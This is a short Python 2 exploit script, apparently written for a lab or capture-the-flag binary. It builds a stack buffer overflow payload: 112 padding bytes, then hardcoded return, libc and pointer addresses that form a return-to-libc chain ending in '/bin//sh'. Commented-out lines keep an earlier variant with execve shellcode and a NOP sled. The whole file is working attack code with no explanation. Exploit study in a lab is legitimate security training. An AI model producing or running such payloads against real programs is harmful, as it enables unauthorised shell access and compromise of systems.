#!/usr/bin/env python2

your_buffer =  "A"*112
#your_buffer =  "A"*116

#shellcode="\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"


##your_buffer=your_buffer+"\xc8\xfc\xff\xbf"
##your_buffer=your_buffer+"\xd8\xee\xff\xbf"
#your_buffer=your_buffer+struct.pack("I",0xbfffee78)
#your_buffer=your_buffer+"\x90\x90\x90\x90"
#your_buffer+=struct.pack("I",0xbffff204)
#your_buffer+="\x90"*200
#your_buffer+=shellcode

#your_buffer=your_buffer+"\xb0\x2d\xe4\xb7"
#your_buffer=your_buffer+"\xa0\x84\x04\x08"
#your_buffer=your_buffer+"\x85\xf2\xff\xbf"
#your_buffer+="/bin"
#your_buffer+="//sh"
#your_buffer+='\0'

your_buffer=your_buffer+"\x48\xef\xff\xbf"
your_buffer=your_buffer+"\xb0\x2d\xe4\xb7"
your_buffer=your_buffer+"\xa0\x84\x04\x08"
your_buffer=your_buffer+"\x85\xf2\xff\xbf"
your_buffer+="/bin"
your_buffer+="//sh"
#your_buffer+='\0'

print(your_buffer)
